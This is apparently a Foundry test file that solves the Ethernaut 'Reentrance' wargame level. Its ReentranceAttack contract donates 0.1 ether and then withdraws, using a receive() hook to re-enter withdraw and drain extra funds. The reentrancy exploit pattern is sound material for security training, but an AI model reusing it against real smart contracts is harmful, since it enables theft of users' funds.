// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/10-Reentrance/Reentrance.sol";
import "../src/levels/10-Reentrance/ReentranceFactory.sol";

contract ReentranceTest is Test {
    Ethernaut public ethernaut;
    ReentranceFactory public reentranceFactory;
    ReentranceAttack public reentranceAttack;
    Reentrance public reentrance;

    address eoa1 = address(0x1);

    function setUp() public {
        vm.deal(eoa1, 10_000 ether);

        ethernaut = new Ethernaut();
        reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);

        vm.startPrank(eoa1);
        address levelAddr = ethernaut.createLevelInstance{value: 1 ether}(
            reentranceFactory
        );
        reentrance = Reentrance(payable(levelAddr));
    }

    function testAttack() public {
        reentranceAttack = new ReentranceAttack{value: 0.1 ether}(reentrance);
        reentranceAttack.attack();
    }
}

contract ReentranceAttack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) payable {
        reentrance = _reentrance;
    }

    function attack() public {
        // donate some funds
        reentrance.donate{value: 0.1 ether}(address(this));

        // withdraw
        reentrance.withdraw(0.1 ether);
    }

    bool first = false;

    receive() external payable {
        if (!first) {
            first = true;
            reentrance.withdraw(0.1 ether);
        }
    }
}
